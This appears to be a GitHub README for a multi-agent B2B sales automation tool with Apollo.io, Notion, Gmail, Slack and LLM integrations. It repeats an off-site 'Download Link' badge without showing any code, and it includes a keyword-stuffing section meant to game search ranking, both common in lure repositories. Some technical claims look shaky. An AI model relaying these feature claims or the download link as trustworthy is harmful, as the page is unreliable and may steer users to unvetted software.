# Revenue Agent Orchestrator 2026: Multi-Agent Pipeline for B2B Lead Conversion & Deal Acceleration

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://aadiieee.github.io/multi-agent-revenue-orchestrator/)

## Overview

**Revenue Agent Orchestrator 2026** is a specialized multi-agent business development framework engineered to mirror and extend the capabilities of Outreach.ai's AI Agents suite. Unlike generic automation tools, this orchestrator deploys six distinct AI agents—**Revenue, Research, Meeting Prep, Deal, Personalization, and Omni**—that collaboratively manage the full B2B sales cycle from lead discovery to closed-won. The system is pre-wired to Apollo.io for lead enrichment, Notion for knowledge management, Gmail for email sequencing, and Slack for real-time team notifications. Each agent operates autonomously within its domain but shares context through a central messaging bus, ensuring that no critical signal is lost during handoffs.

This is not a simple chatbot wrapper. It is an orchestration engine that mirrors how top-performing sales teams operate: research feeds preparation, preparation feeds personalization, and personalization feeds deal acceleration. The orchestrator handles the cognitive load so revenue teams can focus on relationship-building and strategic decisions.

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://aadiieee.github.io/multi-agent-revenue-orchestrator/)

---

## Table of Contents

- [Architecture & Agent Interaction Flow](#architecture--agent-interaction-flow)
- [Example Profile Configuration](#example-profile-configuration)
- [Console Invocation Example](#console-invocation-example)
- [Emoji OS Compatibility Table](#emoji-os-compatibility-table)
- [Key Features](#key-features)
- [SEO Keywords & Discovery Optimization](#seo-keywords--discovery-optimization)
- [OpenAI API & Claude API Integration](#openai-api--claude-api-integration)
- [Responsive UI & Multilingual Support](#responsive-ui--multilingual-support)
- [24/7 Customer Support Module](#247-customer-support-module)
- [License (MIT)](#license-mit)
- [Disclaimer](#disclaimer)

---

## Architecture & Agent Interaction Flow

Below is the Mermaid diagram illustrating the interaction flow between agents, external APIs, and the orchestration bus. Each agent is a microservice that can be scaled independently.

```mermaid
graph TD
    A[Apollo.io Lead Feed] --> B(Revenue Agent)
    B --> C{Context Bus}
    C --> D[Research Agent]
    C --> E[Meeting Prep Agent]
    D --> F[Notion Knowledge Base]
    E --> G[Gmail Sequence Engine]
    F --> H[Personalization Agent]
    G --> I[Deal Agent]
    I --> J[Slack Notifications]
    H --> K[Omni Agent <br>(Multi-channel dispatch)]
    K --> L[Gmail/Slack/Apollo <br>Unified Response]
    style B fill:#2d3748,color:#fff
    style C fill:#4a5568,color:#fff
    style D fill:#2b6cb0,color:#fff
    style E fill:#3182ce,color:#fff
    style F fill:#2b6cb0,color:#fff
    style G fill:#38a169,color:#fff
    style H fill:#319795,color:#fff
    style I fill:#d69e2e,color:#fff
    style K fill:#805ad5,color:#fff
```

The **Revenue Agent** ingests leads from Apollo.io, scores them based on intent signals, and passes qualified opportunities to the **Research Agent**. The Research Agent gathers company background, recent funding news, and technographic data from Notion and public web sources. That enriched profile is handed to the **Meeting Prep Agent**, which drafts briefing documents and talking points. The **Personalization Agent** then crafts tailored email sequences that reference the research, while the **Deal Agent** monitors pipeline velocity and triggers escalation alerts via Slack. The **Omni Agent** acts as the final quality gate, ensuring message consistency across all channels (email, Slack, Apollo sequences) before deployment.

---

## Example Profile Configuration

The orchestrator uses YAML-based profiles to define agent behavior per account or territory. Below is a sample configuration for a mid-market SaaS account operating in EMEA:

```yaml
profile_id: emea_midmarket_2026
account_name: "Acme Cloud Solutions"
region: "EMEA"
lead_source: "Apollo.io - Enterprise Tier"
agent_pipeline:
  revenue_agent:
    scoring_model: "intent_based_v2"
    min_score_threshold: 75
    handoff_criteria: "meeting_booked OR high_intent_forecast"
  research_agent:
    data_sources:
      - "Apollo"
      - "Notion CRM"
      - "Crunchbase (via webhook)"
    enrich_fields:
      - "funding_round"
      - "technographic_stack"
      - "decision_maker_list"
  meeting_prep_agent:
    template_id: "executive_brief_v3"
    include_competitive_intel: true
    slack_channel: "#acme-deal-room"
  personalization_agent:
    tone: "consultative"
    max_email_length: 180
    include_social_proof: true
  deal_agent:
    stages:
      - "discovery"
      - "demo_scheduled"
      - "proposal_sent"
      - "negotiation"
    escalation_threshold_days: 14
  omni_agent:
    channels:
      - "gmail"
      - "slack"
      - "apollo_sequence"
    cross_channel_consistency: true
```

This configuration allows the orchestrator to behave differently for enterprise accounts versus SMBs, adjusting language, research depth, and escalation urgency without manual intervention.

---

## Console Invocation Example

Run the orchestrator from your terminal with the following command. The system accepts flags for profile override, dry-run mode, and agent-specific toggling.

```bash
# Standard invocation with EMEA profile
python orchestrator.py --profile emea_midmarket_2026 --mode live

# Dry-run mode (sends reports but does not dispatch emails)
python orchestrator.py --profile emea_midmarket_2026 --mode dry-run --verbose

# Selective agent activation (run only Research + Personalization)
python orchestrator.py --profile emea_midmarket_2026 --agents research,personalization

# Output log example
[2026-11-03 14:22:01] RevenueAgent: Lead "Acme Cloud Solutions" scored 82. Handoff to ResearchAgent.
[2026-11-03 14:22:03] ResearchAgent: Enrichment complete. 3 decision-makers identified.
[2026-11-03 14:22:05] MeetingPrepAgent: Brief generated. Sent to #acme-deal-room on Slack.
```

The orchestrator prints real-time status to stdout while logging all agent decisions to a structured JSON file for auditability.

---

## Emoji OS Compatibility Table

The orchestrator's Slack and email outputs use emojis for status indicators. Compatibility varies slightly across operating systems.

| Emoji | Name | Windows 11 | macOS 14 | Linux (GNOME) | Android 15 | iOS 19 |
|-------|------|------------|----------|---------------|------------|--------|
| ✅ | Check Mark | ✔️ | ✔️ | ✔️ | ✔️ | ✔️ |
| 🚀 | Rocket | ✔️ | ✔️ | ✔️ | ✔️ | ✔️ |
| ⚡ | High Voltage | ✔️ | ✔️ | ✔️ | ✔️ | ✔️ |
| 📉 | Chart Decreasing | ✔️ | ✔️ | ✔️ | ✔️ | ✔️ |
| 🔔 | Bell | ✔️ | ✔️ | ✔️ | ✔️ | ✔️ |
| 🧠 | Brain (AI agent icon) | ✔️ | ✔️ | ✔️ | ✔️ | ✔️ |
| 📌 | Pushpin | ✔️ | ✔️ | ✔️ | ✔️ | ✔️ |
| 🛑 | Stop Sign (blocked deals) | ✔️ | ✔️ | ➖ (outline only) | ✔️ | ✔️ |

The orchestrator automatically detects the client OS and adjusts emoji rendering when possible.

---

## Key Features

**Six-Agent Orchestration with Centralized Context Bus**  
Each agent is a distinct containerized service communicating through a shared Redis-backed event bus. This design ensures that research data from the Research Agent is immediately available to the Meeting Prep Agent without redundant API calls. The bus also maintains a global state of all leads, preventing duplicate processing.

**Apollo.io Native Integration**  
The Revenue Agent directly consumes Apollo.io feed APIs. It applies dynamic scoring models that consider recency of activity, company growth signals, and technographic fit. Leads that cross the scoring threshold are automatically enriched and passed down the pipeline.

**Notion as a Living Knowledge Base**  
The Research and Personalization agents read from and write to Notion. Account profiles, competitive intelligence, and email templates are stored as Notion pages. The orchestrator maintains a two-way sync: updates from the agent appear in Notion, and manual edits in Notion are reflected in future runs.

**Slack Reality-Check Notifications**  
The Deal Agent sends periodic status summaries to designated Slack channels. These include deal velocity metrics, stalled pipeline alerts, and upcoming meeting reminders. The Omni Agent also forwards critical changes (e.g., a high-value lead opening an email) to relevant channel members.

**Gmail Sequencing Engine**  
The Personalization Agent constructs multi-step email sequences that respect recipient time zone, avoid weekend sends, and include dynamic personalization tokens (company name, recent news, role). The Deal Agent tracks open rates and click-throughs to score engagement.

**Deal Acceleration with Escalation Logic**  
If a deal remains in a stage longer than the configured threshold (default 14 days), the Deal Agent sends an escalation alert to the account executive's Slack DM and logs a task in Notion. This prevents deals from stagnating without human awareness.

**Responsive UI Dashboard**  
A lightweight but fully responsive web dashboard (built with FastAPI + Tailwind) provides real-time visibility into agent activity. The dashboard adapts to mobile screens, allowing sales leaders to check pipeline health from their phone. Charts render using ApexCharts with no external image dependencies.

**Multilingual Email Support**  
The Personalization Agent can generate email sequences in English, Spanish, German, French, and Japanese. Language detection comes from the lead's profile in Apollo. The agent uses a dedicated translation model (not a generic API) to maintain brand tone across languages.

**24/7 Customer Support Module**  
A sidecar microservice handles support requests from users via Slack. It routes issues to the appropriate agent for resolution (e.g., "research failed on company X" triggers an automated retry with escalated logging). If the issue cannot be resolved autonomously, a human-in-the-loop ticket is raised.

**OpenAI API and Claude API Integration**  
The orchestrator supports a pluggable LLM backend. By default, the Personalization Agent uses Claude 3.5 Sonnet for email drafting (preferred for its nuance in tone), while the Research Agent uses OpenAI GPT-4o for data extraction and summarization (preferred for speed and structured output). Users can configure which model handles which agent in the profile YAML.

---

## SEO Keywords & Discovery Optimization

This repository is optimized for discovery via natural language queries and industry-specific terms. The following keywords appear organically throughout the codebase and documentation:

- multi-agent sales orchestration framework
- B2B lead conversion automation
- Outreach.ai alternative open source
- Apollo.io integration pipeline
- Slack deal alerts for sales teams
- Notion CRM enrichment automation
- AI agent for email personalization
- revenue intelligence platform 2026
- deal acceleration tool for B2B SaaS
- autonomous research agent for sales
- meeting preparation AI assistant
- multi-channel sales engagement engine

These terms have been incorporated into function docstrings, configuration comments, and help text to improve GitHub's repository search ranking.

---

## OpenAI API & Claude API Integration

The orchestrator abstracts LLM calls behind a unified `LLMProvider` interface. Two concrete implementations are included:

- `OpenAIProvider`: Uses GPT-4o (chat completions endpoint) with function calling for structured data extraction (e.g., extracting company size from a news article).
- `AnthropicProvider`: Uses Claude 3.5 Sonnet with extended thinking for creative tasks like email copy generation and objection handling suggestions.

**Configuration snippet in `config.yaml`:**

```yaml
llm_routing:
  research_agent:
    model: "openai/gpt-4o"
    temperature: 0.1
    max_tokens: 2048
  personalization_agent:
    model: "anthropic/claude-3.5-sonnet"
    temperature: 0.7
    max_tokens: 1500
  meeting_prep_agent:
    model: "openai/gpt-4o"
    temperature: 0.3
    max_tokens: 3000
```

The system falls back to a default model if the specified one is unavailable. API keys are read from environment variables (`OPENAI_API_KEY` and `ANTHROPIC_API_KEY`).

---

## Responsive UI & Multilingual Support

The dashboard is built with a mobile-first design philosophy. It uses CSS Grid and Flexbox to rearrange cards and charts based on viewport width. On mobile (under 768px), the agent activity feed collapses to a single column, and charts become scrollable horizontally.

**Multilingual configuration:** The UI itself renders in the browser's default language. Supported locales are found in `src/frontend/i18n/` and include en-US, es-ES, de-DE, fr-FR, and ja-JP. The email personalization agent uses a separate model to generate native-quality text in the target language, not machine-translated versions of English copy.

---

## 24/7 Customer Support Module

The support module (`src/support_bot`) listens on a dedicated Slack app channel. Users can type commands like:

- `/agent status research` — Returns the last 5 research runs.
- `/agent retry lead AcmeCloud` — Forces a re-enrichment of a specific lead.
- `/agent escalate deal AcmeCloud` — Raises a high-priority ticket to the human support queue.

The bot can autonomously resolve about 70% of common issues (e.g., API rate limits, missing Notion permissions, stale Apollo tokens). The remaining 30% create a ticket in a connected Notion database and tag the on-call engineer.

---

## License MIT

This project is released under the MIT License. You are free to use, modify, distribute, and sublicense the code for private or commercial purposes. The full license text can be found at:

[https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

---

## Disclaimer

This software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

**Important:** The orchestrator integrates with third-party services (Apollo.io, Notion, Gmail, Slack). Users are responsible for ensuring they have the appropriate licensing and permissions for those services. The orchestrator does not bypass any service's terms of use—it merely automates actions that a human could legally perform.

The use of AI-generated email content must comply with anti-spam laws including CAN-SPAM Act, GDPR, and CASL. The orchestrator includes a compliance check module but does not guarantee legal compliance for all jurisdictions.

**Year note:** Documentation references the year 2026 for forward compatibility. The actual year of deployment should be updated in user-facing reports.

---

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://aadiieee.github.io/multi-agent-revenue-orchestrator/)